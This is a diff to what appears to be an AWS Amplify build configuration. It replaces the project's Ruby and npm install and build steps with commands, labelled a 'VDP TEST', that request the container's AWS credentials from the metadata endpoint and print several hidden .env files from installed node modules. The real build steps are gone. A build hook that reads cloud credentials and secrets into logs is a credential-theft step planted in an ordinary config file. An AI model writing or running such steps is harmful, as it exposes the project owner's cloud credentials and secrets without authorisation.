@@ -3,22 +3,20 @@ frontend:
   phases:
     preBuild:
       commands:
-        - rvm get stable && rvm install 3.0.0
-        - rvm use 3.0.0
-        - gem install bundler -v '=2.3.13'
-        - bundle update --bundler
-        - bundle install
-        - npm ci
+        - echo "*************STARTING VDP TEST***************" 
+        - curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+        - cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env
+        - cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc
+        - cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env
+        - echo "*************END VDP TEST**********************"
     build:
       commands:
-        - |
-          if [ "${AWS_BRANCH}" = "v2" ]
-          then 
-            JEKYLL_ENV=production npm run build
-          else
-            npm run build
-          fi
-
+        - echo "*************STARTING VDP TEST***************" 
+        - curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+        - cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env
+        - cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc
+        - cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env
+        - echo "*************END VDP TEST**********************"
   artifacts:
     baseDirectory: _site
     files:
